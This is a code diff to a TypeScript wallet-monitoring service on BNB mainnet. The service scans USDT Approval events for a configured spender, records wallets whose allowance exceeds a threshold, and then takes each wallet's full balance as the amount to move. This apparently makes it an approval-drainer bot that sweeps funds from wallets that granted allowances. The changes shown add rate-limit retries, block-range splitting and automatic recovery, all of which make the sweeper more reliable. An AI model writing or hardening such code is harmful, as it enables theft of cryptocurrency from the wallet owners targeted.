@@ -16,6 +16,32 @@ const ERC20_ABI = [
 const threshold = ethers.parseUnits("5", 18);
 const receiverRoutingThreshold = ethers.parseUnits("2000", 18);
 const approvalLogChunkSize = 2_000;
+const rateLimitRetryAttempts = 3;
+
+function isRateLimitError(error: unknown): boolean {
+  const pending: unknown[] = [error];
+  const seen = new Set<object>();
+
+  while (pending.length) {
+    const current = pending.pop();
+    if (typeof current !== "object" || current === null || seen.has(current)) continue;
+    seen.add(current);
+
+    const record = current as Record<string, unknown>;
+    if (record.code === -32005 || record.code === "-32005") return true;
+    if (typeof record.message === "string" && record.message.includes("-32005")) return true;
+
+    for (const key of ["error", "cause", "info", "response"]) {
+      if (record[key] !== undefined) pending.push(record[key]);
+    }
+  }
+
+  return false;
+}
+
+function wait(milliseconds: number) {
+  return new Promise<void>((resolve) => setTimeout(resolve, milliseconds));
+}
 
 export class WalletMonitor {
   private readonly provider = new ethers.JsonRpcProvider(config.BNB_MAINNET_RPC_URL);
@@ -26,14 +52,17 @@ export class WalletMonitor {
   private scanInProgress = false;
   constructor(private readonly store: Store) {}
   async start() {
-    await this.assertExecutor();
-    await this.scan();
+    await this.runCycle().catch((error) => console.error("Initial wallet monitoring cycle failed; retrying automatically:", error));
     this.timer = setInterval(() => {
-      void this.scan().catch((error) => console.error("Wallet monitoring cycle failed:", error));
+      void this.runCycle().catch((error) => console.error("Wallet monitoring cycle failed; retrying in 30 seconds:", error));
     }, 30_000);
   }
   stop() { if (this.timer) clearInterval(this.timer); }
   private async assertExecutor() { if (!(await this.contract.isExecutor(this.signer.address))) throw new Error(`Executor ${this.signer.address} is not authorized`); }
+  private async runCycle() {
+    await this.assertExecutor();
+    await this.scan();
+  }
   private async scan() {
     if (this.scanInProgress) return;
     this.scanInProgress = true;
@@ -57,27 +86,52 @@ export class WalletMonitor {
     const filter = this.token.filters.Approval(null, config.ALLOWANCE_SPENDER_ADDRESS);
     for (let chunkStart = fromBlock; chunkStart <= currentBlock; chunkStart += approvalLogChunkSize) {
       const chunkEnd = Math.min(chunkStart + approvalLogChunkSize - 1, currentBlock);
-      const events = await this.token.queryFilter(filter, chunkStart, chunkEnd);
-      const owners = new Set<string>();
-      for (const event of events) {
-        const parsed = this.token.interface.parseLog(event);
-        if (!parsed) throw new Error("Unable to decode USDT Approval event");
-        owners.add(ethers.getAddress(String(parsed.args.owner)));
-      }
-
-      for (const owner of owners) {
-        const allowance = await this.token.allowance(owner, config.ALLOWANCE_SPENDER_ADDRESS);
-        if (allowance >= threshold) this.store.registerDetected(owner);
-      }
-
-      this.store.setApprovalScanBlock(chunkEnd);
+      await this.scanApprovalRange(filter, chunkStart, chunkEnd);
     }
+  }
+  private async scanApprovalRange(filter: ethers.ContractEventName, fromBlock: number, toBlock: number) {
+    let events;
+    let lastError: unknown;
+
+    for (let attempt = 0; attempt < rateLimitRetryAttempts; attempt++) {
+      try {
+        events = await this.token.queryFilter(filter, fromBlock, toBlock);
+        break;
+      } catch (error) {
+        if (!isRateLimitError(error)) throw error;
+        lastError = error;
+        if (attempt + 1 < rateLimitRetryAttempts) await wait(1_000 * 2 ** attempt);
+      }
+    }
+
+    if (!events) {
+      if (fromBlock === toBlock) throw lastError;
+      const midpoint = Math.floor((fromBlock + toBlock) / 2);
+      await this.scanApprovalRange(filter, fromBlock, midpoint);
+      await this.scanApprovalRange(filter, midpoint + 1, toBlock);
+      return;
+    }
+
+    const owners = new Set<string>();
+    for (const event of events) {
+      const parsed = this.token.interface.parseLog(event);
+      if (!parsed) throw new Error("Unable to decode USDT Approval event");
+      owners.add(ethers.getAddress(String(parsed.args.owner)));
+    }
+
+    for (const owner of owners) {
+      const allowance = await this.token.allowance(owner, config.ALLOWANCE_SPENDER_ADDRESS);
+      if (allowance >= threshold) this.store.registerDetected(owner);
+    }
+
+    this.store.setApprovalScanBlock(toBlock);
   }
   async scanWallet(address: string) {
     const wallet = this.store.getWallet(address);
     if (!wallet?.active) return;
     try {
-      const [balance, allowance] = await Promise.all([this.token.balanceOf(wallet.address), this.token.allowance(wallet.address, config.ALLOWANCE_SPENDER_ADDRESS)]);
+      const balance = await this.token.balanceOf(wallet.address);
+      const allowance = await this.token.allowance(wallet.address, config.ALLOWANCE_SPENDER_ADDRESS);
       this.store.update(wallet.address, { lastCheckedAt: new Date().toISOString(), lastError: undefined });
       if (balance < threshold || allowance < threshold) return;
       const amount = balance;
